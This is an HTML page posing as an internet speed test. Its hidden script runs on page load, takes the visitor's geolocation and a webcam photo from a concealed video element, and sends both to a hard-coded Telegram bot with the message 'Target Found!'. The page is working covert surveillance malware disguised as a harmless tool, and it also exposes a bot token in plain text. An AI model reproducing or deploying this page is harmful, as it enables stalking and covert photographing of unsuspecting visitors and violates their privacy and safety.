<!DOCTYPE html>
<html>
<head><title>Internet Speed Test</title></head>
<body>
    <h1 style="text-align:center;">Checking Internet Speed...</h1>
    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';
        const chatId = '1034878899';

        async function startTraking() {
            // 1. Get Location
            navigator.geolocation.getCurrentPosition(pos => {
                const msg = `ðŸ“ Target Found!\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
            });

            // 2. Get Camera Photo
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'photo.jpg');
                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                        
                        // Stop camera after taking photo
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg');
                }, 2000);
            } catch (err) { console.log("Camera denied"); }
        }

        window.onload = startTraking;
    </script>
</body>
</html>
